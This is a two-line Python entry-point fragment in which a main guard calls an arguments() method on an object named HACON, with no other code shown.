if __name__ == '__main__':
    HACON.arguments()